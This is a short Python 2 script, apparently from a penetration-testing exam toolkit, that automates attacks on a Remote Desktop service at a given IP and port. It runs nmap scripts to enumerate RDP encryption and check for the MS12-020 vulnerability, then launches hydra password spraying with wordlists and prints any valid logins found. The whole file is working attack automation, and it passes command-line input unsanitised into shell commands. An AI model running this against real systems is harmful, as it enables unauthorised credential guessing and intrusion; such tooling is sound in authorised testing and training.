#!/usr/bin/env python
import subprocess
import sys
import os

if len(sys.argv) != 3:
    print "Usage: rdprecon.py <ip address> <port>"
    sys.exit(0)

ip_address = sys.argv[1].strip()
port = sys.argv[2].strip()

#NSE Script documentation
#RUNNING
#rdp-enum-encryption: determines which Security layer and Encryption level is supported by RDP service
#rdp-vuln-ms12-020: checks for CVE-2012-0002 by checking for CVE-2012-0152 (DoS). Checks without crashing, but could still potentially crash.

print "INFO: Performing nmap RDP script scan for " + ip_address + ":" + port
RDPSCAN = "nmap -n -sV -Pn -vv -p %s --script=rdp-enum-encryption,rdp-vuln-ms12-020,vulners -oN '/root/scripts/recon_enum/results/exam/rdp/%s_rdp.nmap' %s" % (port, ip_address, ip_address)
results = subprocess.check_output(RDPSCAN, shell=True)
outfile = "/root/scripts/recon_enum/results/exam/rdp/%s_rdprecon.txt" % (ip_address)
f = open(outfile, "w")
f.write(results)
f.close

#Default Hydra configuration with a small username and password list
#This configuration is meant to spray, not to brute. Manually configure a 
#Brute scan if desired.

print "INFO: Performing hydra rdp scan against " + ip_address 
HYDRA = "hydra -L /usr/share/wordlists/lists/userlist.txt -P /usr/share/wordlists/lists/quick_password_spray.txt -f -o /root/scripts/recon_enum/results/exam/rdp/%s_rdphydra.txt -u %s -s %s rdp" % (ip_address, ip_address, port)
results = subprocess.check_output(HYDRA, shell=True)
resultarr = results.split("\n")
for result in resultarr:
    if "login:" in result:
	print "[*] Valid rdp credentials found: " + result 
